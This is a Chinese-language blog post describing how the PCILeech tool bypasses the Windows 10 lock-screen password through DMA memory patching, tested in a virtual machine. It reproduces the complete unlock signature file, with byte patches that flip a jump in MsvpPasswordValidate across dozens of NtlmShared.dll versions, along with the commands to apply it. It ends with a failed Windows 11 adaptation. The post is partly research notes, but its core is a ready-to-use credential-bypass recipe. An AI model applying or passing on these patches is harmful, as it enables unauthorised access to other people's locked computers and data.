---
layout:     post
title:      【技术研究】使用Pcileech绕过windows锁屏密钥
subtitle:   TEC
date:       2024-03-27
author:     Corax
header-img: img/post-bg-coffee1.jpg
catalog: true
tags:
    - 【技术研究】
    - 【逆向】
---

## 资料

https://github.com/ufrisk/pcileech

https://github.com/ufrisk/LeechCore/wiki/Device_VMWare

本篇博客有关于通过使用pcileech的unlock模块，绕过windows10版本锁屏密码（本地帐号）。

第一个是pcileech的项目地址 本篇大部分内容与此相关。

也贴出pcileech的有关dma测信道攻击的博客，有些信息还是蛮有用的

https://www.iotsec-zone.com/article/165

## windows10测试

在虚拟机内安装好windows10并设定好本地账号密码

如下界面

![image-20240328183527441](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851300.png)

下面我们使用pcileech 这里我是github下载的最新发布版

pcileech现在简单来讲就是可以无需进入系统，利用dma机制，直接读入且拥有修改内存的权限。

测试链接 一切正常 可以读入目标机数据

![image-20240328183615935](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851302.png)

unlock为pcileech内置的 简单看一下代码

```
# Unlock Signatures for Local and AD Accounts for Windows 10 x64 version
#
# Method 1: (faster):
# 1.1 check pid of lsass.exe: pcileech pslist
# 1.2 patch: pcileech patch -sig wx64_unlock_win10.sig -all -pid <pid_of_lsass>
#
# Method 2:
# 2.1 patch: pcileech patch -sig wx64_unlock_win10.sig -all
#
# Syntax: see signature_info.txt for more information.
# Generated on 2023-11-26 16:58:59
#
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.16384 / 2015-07-10]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.18366 / 2019-09-30]
5DC,488BCBFF154B1C0000,5E8,0F8518FBFFFF,5E8,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.19387 / 2022-08-04]
65C,488BCBFF15CB1B0000,668,0F8518FBFFFF,668,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.19869 / 2023-03-30]
66C,488BCBFF15BB1B0000,678,0F8518FBFFFF,678,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10586.0 / 2015-10-30]
62C,488BCBFF15B31B0000,638,0F8518FBFFFF,638,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.0 / 2016-07-16]
6DC,488BCBFF15D31B0000,6E8,0F8518FBFFFF,6E8,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.2791 / 2019-02-06]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.3269 / 2019-09-29]
6EC,488BCBFF15C31B0000,6F8,0F8518FBFFFF,6F8,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.5291 / 2022-08-07]
76C,488BCBFF15431B0000,778,0F8518FBFFFF,778,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.5850 / 2023-03-30]
77C,488BCBFF15331B0000,788,0F8518FBFFFF,788,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.15063.1631 / 2019-02-06]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.15063.2106 / 2019-09-30]
622,488BCBFF15B51C0000,62E,0F852EFBFFFF,62E,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.15254.245 / 2018-01-30]
612,488BCBFF15C51C0000,61E,0F852EFBFFFF,61E,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.1268 / 2019-07-05]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.1448 / 2019-10-02]
622,488BCBFF15C51C0000,62E,0F852EFBFFFF,62E,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.192 / 2018-01-01]
612,488BCBFF15D51C0000,61E,0F852EFBFFFF,61E,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.1067 / 2019-10-02]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.590 / 2019-02-06]
6A2,488BCBFF15451C0000,6AE,0F852EFBFFFF,6AE,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.523 / 2019-01-01]
692,488BCBFF15551C0000,69E,0F852EFBFFFF,69E,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.10935 / 2022-08-05]
7CD,488BCBFF15221B0000,7D9,0F840BFBFFFF,7D9,0F85
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.194 / 2018-12-04]
73D,488BCBFF15B21B0000,749,0F840BFBFFFF,749,0F85
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.316 / 2019-02-06]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.802 / 2019-10-02]
74D,488BCBFF15A21B0000,759,0F840BFBFFFF,759,0F85
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.5122 / 2023-11-08]
7DD,488BCBFF15121B0000,7E9,0F840BFBFFFF,7E9,0F85
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.1 / 2019-03-18]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.10022 / 2019-09-15]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.418 / 2019-10-06]
72F,488BCBFF15C01B0000,73B,0F8409FBFFFF,73B,0F85
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.1 / 2019-12-07]
423,488BCB48FF1553200000,435,0F84BAFAFFFF,435,0F85
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.2728 / 2023-03-09]
4B3,488BCB48FF15C31F0000,4C5,0F84BAFAFFFF,4C5,0F85
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.2965 / 2023-04-27]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.3636 / 2023-10-20]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.3684 / 2023-10-17]
4C3,488BCB48FF15B31F0000,4D5,0F84BAFAFFFF,4D5,0F85
```

可以看到很多版本，我下载的windows10使用的NtlmShared.dll的版本为

![image-20240328183904657](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851303.png)

可以找到对应的修改代码为

![image-20240328183924759](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851304.png)

暂且我们不用管，直接用

![image-20240328183951814](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851305.png)

可以看到successful 成功，来使用一下

可以看到直接成功

![image-20240328184050455](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851306.png)

下面来简单看一下原理

### 原理浅谈

![image-20240328184111474](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851307.png)

可以看到这里的语句是关键处

423等似乎是表示dll的作用，暂且不是很明了，其中两段长字符和0f85，比较容易看出来是十六进制的机器代码，0f85 jnz

我们把这个ntlmshared.dll给拷贝下来直接在hex里面搜

找到偏移位置

![image-20240328184308751](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851308.png)

进入汇编

![image-20240328184352006](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851309.png)

可以看到就在这里 这就是在msvppasswordvalidate这个函数，这个函数作用一=一般用于锁屏验证

这里把原来的0f84变成0f85也就是jz变jnz了

![image-20240328184628543](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851310.png)

f5看看

是在这个判断里面

![image-20240328184649136](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851311.png)

目前还没研究到为什么unlock会想到在这个里面做手脚。

## windows11测试

因为里面还提供了windows11的版本，所以像拿来跑跑看win11能否绕过

前辈告诉我本身的脚本是不行的，所以需要魔改

尝试着在函数入口处进行魔改

使之直接返回0x1

![image-20240328184846218](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851312.png)

脚本魔改一下

![image-20240328184926803](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851313.png)

跑一下

![image-20240328184936731](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851314.png)

发现锁屏进不去，看看是否成功patch了

![image-20240328175042140](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403281851315.png)

可以看到成功是成功了

但是就是进不去，这里认为patch的位置有些问题。

明天再看吧 现在顶多算是初探，后面好好研究一下dma和这个patch位置。